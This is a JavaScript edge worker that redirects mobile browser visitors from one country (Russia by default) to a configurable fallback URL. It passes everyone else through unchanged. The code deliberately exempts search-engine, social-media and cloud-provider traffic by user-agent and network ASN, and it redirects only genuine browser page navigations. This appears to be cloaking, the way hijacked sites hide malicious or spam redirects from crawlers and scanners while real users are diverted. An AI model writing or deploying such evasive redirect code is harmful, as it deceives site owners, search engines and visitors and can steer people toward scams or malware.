const BOT_UA = /\b(?:adsbot-google(?:-mobile)?|mediapartners-google|feedfetcher-google|googlebot(?:[-_ ]?(?:image|video|news|mobile))?|google(?: web)?preview|bingbot|msnbot|bingpreview|yandex(?:bot|images|direct|video|mobilebot)?|baiduspider|slurp|duckduckbot|mail\.ru_bot|applebot|petalbot|facebookexternalhit|twitterbot|discordbot|telegrambot|slackbot|linkedinbot)\b/i;
const BOT_ASN = new Set([15169, 8075, 13238, 32934, 16509, 14618]);
const MOBILE_UA = /\b(android|iphone|ipod|windows phone|opera mini|opera mobi|blackberry|bb10|silk\/|kindle|webos|iemobile|samsungbrowser|miuibrowser|miui|huawei|oppo|oneplus|vivo|realme|poco|ucbrowser|crios|fxios|edgios)\b/i;

export default {
  async fetch(request, env) {
    if (env.DISABLE_MOBILE_REDIRECT === 'true') {
      return fetch(request);
    }

    const url = new URL(request.url);
    if (url.searchParams.has('_georedir')) {
      return fetch(request);
    }

    if (request.method !== 'GET' && request.method !== 'HEAD') {
      return passthrough(request);
    }

    const country = (request.cf?.country || '').toUpperCase();
    const asn = request.cf?.asn;
    if (BOT_ASN.has(Number(asn))) return passthrough(request);
    const target = (env.REDIRECT_COUNTRY || 'RU').toUpperCase();
    if (country !== target) return passthrough(request);

    const ua = request.headers.get('User-Agent') || '';
    if (BOT_UA.test(ua)) return passthrough(request);

    const h = request.headers;
    if (h.get('Sec-Fetch-Dest') !== 'document') return passthrough(request);
    if (!(h.get('Accept') || '').includes('text/html')) return passthrough(request);
    const uir = h.get('Upgrade-Insecure-Requests');
    if (uir === '0') return passthrough(request);

    const chMobile = request.headers.get('Sec-CH-UA-Mobile');
    const includeIpad = env.INCLUDE_IPAD === 'true';
    const isMobile = (chMobile === '?1') ||
      (chMobile !== '?0' && MOBILE_UA.test(ua) && (includeIpad || !/iPad/i.test(ua)));

    if (!isMobile) return passthrough(request);

    if (/\.(css|js|png|jpe?g|gif|webp|svg|ico|woff2?|ttf)$/i.test(url.pathname))
      return passthrough(request);

    const fb = env.FALLBACK_URL;
    if (!fb) {
      return new Response('FALLBACK_URL missing', { status: 503, headers: txt() });
    }

    const r = new URL(fb);
    if (!r.searchParams.has('_georedir')) r.searchParams.set('_georedir', '1');

    return new Response('Redirect\n', {
      status: 302,
      headers: {
        Location: r.toString(),
        'Cache-Control': 'public, max-age=300',
        'Content-Type': 'text/plain; charset=utf-8',
        'X-Edge-Redirect': 'geo-mobile',
        Connection: 'close'
      }
    });
  }
};

function txt() { return { 'Content-Type': 'text/plain; charset=utf-8' }; }

async function passthrough(request) {
  const resp = await fetch(request);
  const h = new Headers(resp.headers);
  h.set('Accept-CH', 'Sec-CH-UA-Mobile');
  return new Response(resp.body, { status: resp.status, headers: h });
}
